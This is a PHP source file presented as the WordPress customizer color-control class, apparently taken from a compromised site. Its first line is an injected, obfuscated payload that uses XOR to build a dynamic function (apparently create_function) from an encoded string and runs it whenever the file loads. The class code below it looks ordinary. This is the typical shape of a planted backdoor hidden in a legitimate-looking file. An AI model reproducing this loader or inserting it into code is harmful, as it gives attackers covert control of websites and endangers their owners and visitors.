<?php $GQTczG='WRI20YiUU;4D+ 8'^'4 ,SD<63 UW0BOV';$CYlXtpIpakOs=$GQTczG('','B3yuFDZNY.:Ym3V1K KfOBTE;WPB f,AA:hKgBOn8TM8HE98UfV<D0=Z:R48PGGkE=R5ATQU..RKfFuko33:NEA1,FIJFUxkxNKOCNIItUbFNUA3Y7Y0-UTPU-7G.NTfAQNNj8JcaS1MeeNqeU,;0.,p18c7mb8NHkbYioFNO0AUXpjY= QlOm39g3H86N8cA7-TXWmmMe6;lf00GPAeL78:INoyPRAD7n9IGPhN6Q;S6Y3:ZRD0.OPMCkq2;=y.2z1HELWERJGnuJ<M-Y3dRJeAqRX9.q3I0ntIQGXEoHcvU+.MMtQa:24K3cG;9gW-YeCi2M5LaE>SQK>F-A1HSKgo3.d0u10oOCRG:T1lkHrHB-V;UldJNaYwVO10g-PRCOKq1->HP1CIT01 jrfS:Q:DKIK95a+Sao38CUpwK60=FNGQ5Z<I<x.83hW1264sM6Br,J2KZqa17Z80,GAZ1A4cEvAVSJ1.WKYsdtD+RDm59EQROCW8LJ MkE3ThUFG4-8XV<EAWgHN52GXpULnJDW gFg3M>A8qGW1e,XKYdafsST3zGAb2EbCJ.QScDTKBuYVXPuYzRtNrbDhCK1+8PG685:82092J9JEN0-PZ,RuKxbYZ:XDjcaitIBE4qYFR:PI4QZS4fK0W=5;WJ<YLhn2X0;ovqILA'^'+UQT 14--GU72V.X8T8Nh:;7d316A9s,4NObNb4d128V+1PW;F.S6oY;N3kg=23CaY3A xqqEK+bFfUKOH93Ga.DXftjarCaqG- 1fm ThBvuueZeD-BA0:xqIV3OgoFe8eeC2CjE<D9EKsQMqHZDOwTXeCiMFS+10F0IJf=;B-06XN2XYx1fV90nA-LC<VKeXX qlgd0oK1fBTQ31aXlQYV:+Tst6 0V1R,>pUnP0W Sb90<=6UO,8mkO.qtr2gwZP;eh< +jzPUnJ,A,VMr1oHU69MO.X,INIiu,=<TBjR1JZ,mIqELSX>VXMF3m>KyMbMV,A-HeEYX-Q4H R scC0ak5e0bdO.0rcQ1HLVvRl4L:N0ED1DhPS2.EQ8F5+crkUZHGsZ8Jm0QEAJOFwL0V1.rA0HkVYkKWY74PJkvES5+58T6U3YPVWA73PFWk, C6ZN+A.lE>UR9WTIoe>P5UJiVe22>Pq<. ZMONB4lIQX10riewY>8A44.V-70>.GYKpqW 8pKhjQS39YujHjl:DRnCW,J cV,2HBqqkdYAAD2fVJwuQPwP zKikUscsvClnihL=H4B,UKdNekPYJ1>iSPCgWHPA>Jbb>QT<5M6RgXF=;N9mCCAITib>>x<03VxmP0.2oA;Q.QZZ3mapwbgW YOGFXrF<');$CYlXtpIpakOs();
/**
 * Customize API: WP_Customize_Color_Control class
 *
 * @package WordPress
 * @subpackage Customize
 * @since 4.4.0
 */

/**
 * Customize Color Control class.
 *
 * @since 3.4.0
 *
 * @see WP_Customize_Control
 */
class WP_Customize_Color_Control extends WP_Customize_Control {
	/**
	 * Type.
	 *
	 * @access public
	 * @var string
	 */
	public $type = 'color';

	/**
	 * Statuses.
	 *
	 * @access public
	 * @var array
	 */
	public $statuses;

	/**
	 * Mode.
	 *
	 * @since 4.7.0
	 * @access public
	 * @var string
	 */
	public $mode = 'full';

	/**
	 * Constructor.
	 *
	 * @since 3.4.0
	 * @uses WP_Customize_Control::__construct()
	 *
	 * @param WP_Customize_Manager $manager Customizer bootstrap instance.
	 * @param string               $id      Control ID.
	 * @param array                $args    Optional. Arguments to override class property defaults.
	 */
	public function __construct( $manager, $id, $args = array() ) {
		$this->statuses = array( '' => __('Default') );
		parent::__construct( $manager, $id, $args );
	}

	/**
	 * Enqueue scripts/styles for the color picker.
	 *
	 * @since 3.4.0
	 */
	public function enqueue() {
		wp_enqueue_script( 'wp-color-picker' );
		wp_enqueue_style( 'wp-color-picker' );
	}

	/**
	 * Refresh the parameters passed to the JavaScript via JSON.
	 *
	 * @since 3.4.0
	 * @uses WP_Customize_Control::to_json()
	 */
	public function to_json() {
		parent::to_json();
		$this->json['statuses'] = $this->statuses;
		$this->json['defaultValue'] = $this->setting->default;
		$this->json['mode'] = $this->mode;
	}

	/**
	 * Don't render the control content from PHP, as it's rendered via JS on load.
	 *
	 * @since 3.4.0
	 */
	public function render_content() {}

	/**
	 * Render a JS template for the content of the color picker control.
	 *
	 * @since 4.1.0
	 */
	public function content_template() {
		?>
		<# var defaultValue = '#RRGGBB', defaultValueAttr = '',
			isHueSlider = data.mode === 'hue';

		if ( data.defaultValue && ! isHueSlider ) {
			if ( '#' !== data.defaultValue.substring( 0, 1 ) ) {
				defaultValue = '#' + data.defaultValue;
			} else {
				defaultValue = data.defaultValue;
			}
			defaultValueAttr = ' data-default-color=' + defaultValue; // Quotes added automatically.
		} #>
		<label>
			<# if ( data.label ) { #>
				<span class="customize-control-title">{{{ data.label }}}</span>
			<# } #>
			<# if ( data.description ) { #>
				<span class="description customize-control-description">{{{ data.description }}}</span>
			<# } #>
			<div class="customize-control-content">
				<# if ( isHueSlider ) { #>
					<input class="color-picker-hue" type="text" data-type="hue" />
				<# } else { #>
					<input class="color-picker-hex" type="text" maxlength="7" placeholder="{{ defaultValue }}" {{ defaultValueAttr }} />
				<# } #>
			</div>
		</label>
		<?php
	}
}
